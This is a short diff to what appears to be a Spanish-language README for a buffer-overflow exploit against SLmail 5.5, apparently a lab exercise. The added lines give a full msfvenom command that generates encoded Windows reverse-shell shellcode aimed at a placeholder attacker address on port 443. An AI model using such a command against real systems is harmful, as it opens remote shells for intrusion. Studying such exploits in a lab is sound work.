@@ -42,6 +42,11 @@ nuestro codigo y proporcionarnos nuestra reverse shell, o el comando que queramo
 
 Bof a Slmail 5.5
 
+Para conseguir el shellcode se puede hacer uso de la herramienta msfvenom:
+
+> msfvenom -p windows/shell_reverse_tcp LHOST=tuDireccionIP LPORT=443 -a x86 --platform windows -b "Aqui van los badChards" -e x86/shikata_ga_nai -f c
+
+
 > El script esta hecho en python3
 
 
